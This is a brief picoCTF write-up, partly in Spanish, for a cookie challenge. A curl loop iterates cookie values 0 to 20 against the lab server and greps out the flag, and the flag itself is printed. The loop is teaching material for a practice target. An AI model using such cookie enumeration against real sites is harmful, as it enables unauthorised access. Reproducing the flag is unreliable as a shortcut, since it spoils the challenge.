## Objetivo

Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:29649/](http://mercury.picoctf.net:29649/)
## Solución
```
┌──(kali㉿kali)-[~]
└─$ for i in {0..20}; do curl -s  http://mercury.picoctf.net:29649/check -H "Cookie: name=$i"; done | grep pico 

            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}</code></p>
                                                                                  
┌──(kali㉿kali)-[~]
└─$ 
```


## Notas adicionales
Se puede editar la cookie desde la pagina o mediante la terminal.
Haremos un for del 0 al 20 para que recorra todas las cookie con el grep le pedimos que nos muestre 

## Referencias